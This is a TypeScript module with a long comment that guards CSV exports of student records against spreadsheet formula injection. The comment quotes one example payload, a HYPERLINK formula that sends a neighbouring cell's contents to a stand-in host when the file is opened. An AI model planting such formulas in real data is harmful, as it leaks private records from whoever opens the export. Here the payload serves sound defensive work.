/**
 * CSV cell neutralisation against spreadsheet formula injection.
 *
 * RFC 4180 quoting -- which both exports already did correctly -- makes a
 * value survive the CSV *parser*. It does nothing about what Excel, LibreOffice
 * and Google Sheets do NEXT: a cell whose first character is `=`, `+`, `-`, `@`,
 * a tab or a carriage return is interpreted as a FORMULA, not as text.
 *
 * That matters here because this app's own design point is that exports are
 * "openable without the system" -- a Registrar downloading the student list
 * and opening it in Excel is the intended workflow, not an edge case. A
 * student name, course title, instructor or room stored as
 *
 *     =HYPERLINK("https://example.test/?"&A1,"Results")
 *
 * becomes a live link that exfiltrates the neighbouring cell the moment the
 * file is opened, and the DDE variants can do considerably worse. The person
 * who plants it needs data-entry access; the person who triggers it is
 * whoever opens the export, which is typically someone more privileged.
 *
 * The fix is the standard one: prefix a single quote, which every major
 * spreadsheet treats as "the rest of this cell is literal text". It is
 * applied ONLY to values that actually begin with a dangerous character, so
 * ordinary cells are byte-for-byte unchanged.
 *
 * A leading `-` is deliberately allowed through for genuine negative numbers
 * -- `-3` is data, `-1+1` is a formula -- so the numeric case is excluded
 * rather than mangled.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^-?\d+(?:\.\d+)?$/;

export function neutraliseFormula(value: string): string {
  if (!FORMULA_LEAD.test(value)) return value;
  if (PLAIN_NUMBER.test(value)) return value;
  return `'${value}`;
}

/** RFC 4180 quoting on top of the neutralisation above. */
export function csvCell(value: unknown): string {
  const raw = value === null || value === undefined ? "" : String(value);
  const safe = neutraliseFormula(raw);
  return /[",\n\r]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
}
